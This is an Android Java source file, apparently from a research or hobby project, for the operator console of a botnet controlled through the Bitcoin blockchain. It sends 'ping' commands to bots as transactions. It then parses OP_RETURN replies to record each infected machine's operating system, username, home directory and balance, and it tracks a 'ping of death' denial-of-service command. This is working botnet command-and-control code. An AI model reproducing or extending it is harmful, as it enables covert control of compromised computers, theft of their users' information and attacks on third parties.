package com.example.tonipagliaro.botchain;

import android.content.Intent;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Handler;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.ProgressBar;
import android.widget.TextView;

import org.bitcoinj.core.Coin;
import org.bitcoinj.core.Transaction;
import org.bitcoinj.core.listeners.DownloadProgressTracker;
import org.bitcoinj.wallet.Wallet;
import org.bitcoinj.wallet.listeners.WalletCoinsReceivedEventListener;

import java.util.Collection;
import java.util.Date;

public class MainActivity extends AppCompatActivity {

    ApplicationState appState;

    ProgressBar progressBar;
    TextView textView;

    DownloadProgressTracker downloadTracker;
    int progressBarStatus = 0;
    private Handler progressBarHandler = new Handler();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        appState = (ApplicationState) getApplication();

        progressBar = (ProgressBar) this.findViewById(R.id.progressBar);
        textView = (TextView) this.findViewById(R.id.textView);
        Log.d("App", appState.wallet.getBalance().toFriendlyString());

        Log.d("App", "MainActivity");

        appState.wallet.addCoinsReceivedEventListener(new WalletCoinsReceivedEventListener() {
            @Override
            public void onCoinsReceived(Wallet wallet, Transaction tx, Coin prevBalance, Coin newBalance) {
                Log.d("App", appState.wallet.getBalance().toFriendlyString());
                appState.saveWallet();
                //trovare indirizzo del bot da transaction
                Coin value = tx.getValueSentToMe(wallet);
                try {
                    String mess = appState.readOpReturn(tx);

                    String[] v = mess.split("-");
                    String comando = v[0];

                    Log.d("App", "comando: " + comando);

                    String addressString = v[1];

                    Log.d("App", "address:" + addressString);

                    String balance = "";

                    if (appState.hasMapAddress(addressString)) {
                        switch (comando) {
                            case ("os_ok"):
                                appState.setStatoBot(addressString, appState.BOT_STATE_ONLINE);
                                String os = v[2];
                                balance = v[3];
                                appState.db.updateOs(addressString, os);
                                appState.db.updateBalance(addressString, balance);
                                //appState.writeQuestFile("SISTEMA OPERATIV BOT: " + os);
                                Log.d("App", "SISTEMA OPERATIV BOT: " + os +", BALANCE = " +balance);
                                break;
                            case ("ping_ok"):
                                appState.setStatoBot(addressString, appState.BOT_STATE_ONLINE);
                                balance = v[2];
                                appState.db.updateBalance(addressString, balance);
                                for (String s : appState.mappaIndirizzi.keySet()) {
                                    Log.d("App", "indirizzo " + s + " valore " + appState.mappaIndirizzi.get(s));
                                }
                                break;
                            case ("username_ok"):
                                appState.setStatoBot(addressString, appState.BOT_STATE_ONLINE);
                                String username = v[2];
                                balance = v[3];
                                appState.db.updateBalance(addressString, balance);
                                appState.db.updateUsername(addressString, username);
                                //appState.writeQuestFile("SISTEMA OPERATIV BOT: " + username);
                                Log.d("App", "SISTEMA OPERATIV BOT: " + username);
                                break;
                            case ("userhome_ok"):
                                appState.setStatoBot(addressString, appState.BOT_STATE_ONLINE);
                                String userhome = v[2];
                                balance = v[3];
                                appState.db.updateBalance(addressString, balance);
                                appState.db.updateUserHome(addressString, userhome);
                                //appState.writeQuestFile("SISTEMA OPERATIV BOT: " + userhome);
                                Log.d("App", "USERHOME BOT: " + userhome);
                                break;
                            case ("pingOfDeath_ok"):
                                appState.setStatoBot(addressString, appState.BOT_STATE_ONLINE);
                                String pingOfDeath = v[2];
                                balance = v[2];
                                appState.db.updateBalance(addressString, balance);
                                appState.db.updatePingOfDeath(addressString, pingOfDeath);
                                //appState.writeQuestFile("SISTEMA OPERATIV BOT: " + userhome);
                                Log.d("App", "PING OF DEATH BOT: " + pingOfDeath);
                                break;
                            case ("restart_ok"):
                                appState.setStatoBot(addressString, appState.BOT_STATE_START);
                                balance = v[2];
                                appState.db.updateBalance(addressString, balance);
                                //appState.writeQuestFile("SISTEMA OPERATIV BOT: " + userhome);
                                break;
                            default:
                                break;
                        }
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        });

        new DownloadBlockchain().execute();



    }

    private class DownloadBlockchain extends AsyncTask<Void, Integer, String> {

        @Override
        protected String doInBackground(Void... par) {
            //PeerGroup peerGroup = new PeerGroup(appState.params, appState.chain);
            //peerGroup.addPeerDiscovery(new DnsDiscovery(appState.params));
            //peerGroup.addWallet(appState.wallet);
            Log.d("App", "Scarico la blockchain");

            appState.peerGroup.start();
            appState.peerGroup.startBlockChainDownload(downloadTracker = new DownloadProgressTracker() {

                @Override
                protected void progress(double pct, int blocksSoFar, Date date) {
                    publishProgress((int) pct);
                }

                @Override
                public void doneDownload() {
                    publishProgress(100);
                }

            });
            //appState.downloadBlockchainFromPeers(downloadTracker);
            try {
                downloadTracker.await();
            } catch (InterruptedException e) {
                e.printStackTrace();
                Log.e("App", "Errore durante il download della blockchain");
            }

            return null;
        }

        @Override
        protected void onProgressUpdate(Integer... values) {
            progressBar.setProgress(values[0]);
            textView.setText(values[0] + " %");
        }

        @Override
        protected void onPostExecute(String s) {


            appState.saveWallet();

            textView.setVisibility(View.INVISIBLE);

            Button b=(Button)findViewById(R.id.button);
            Log.d("App",appState.wallet.currentReceiveKey().toAddress(appState.params).toString());
            b.setVisibility(View.VISIBLE);
            b.setOnClickListener(new View.OnClickListener() {
                @Override
                public void onClick(View v) {
                    try {

                        appState.wallet.addWatchedAddress(appState.wallet.freshReceiveAddress());

                        Log.d("MAP", "MAPPA PRIMA PING INIZIALE");
                        appState.logMappaIndirizzi();
                        //Inviamo il comando solo ai bot che hanno lo stato START (0,002 Bitcoin)
                        String message = "ping-"+appState.wallet.currentReceiveKey().toAddress(appState.params).toString();
                        Log.d("App", "NUMERO DEI BOT CON STATO START: " +appState.getBotStateStart().size());
                        appState.sendCommand(message);

                        //Inviamo il comando solo ai bot che hanno lo stato ONLINE (0,001 Bitcoin)
                        //appState.sendCommand(Coin.MILLICOIN, message, appState.getBotStateOnline());

                        //Cambia lo stato dei bot in "no"
                        appState.setStatoBots(appState.BOT_STATE_OFFLINE);

                        Log.d("MAP", "MAPPA DOPO PING INIZIALE");
                        appState.logMappaIndirizzi();

                        Collection<Transaction> tran = appState.wallet.getRecentTransactions(1, true);
                        for (Transaction out : tran) {
                            Log.d("TRANSACTION", out.toString());
                        }

                        Intent intent = new Intent(MainActivity.this, BotListActivity.class);
                        startActivity(intent);

                    } catch (Exception e) {
                        e.printStackTrace();
                    }

                }
            });

        }



    }



}
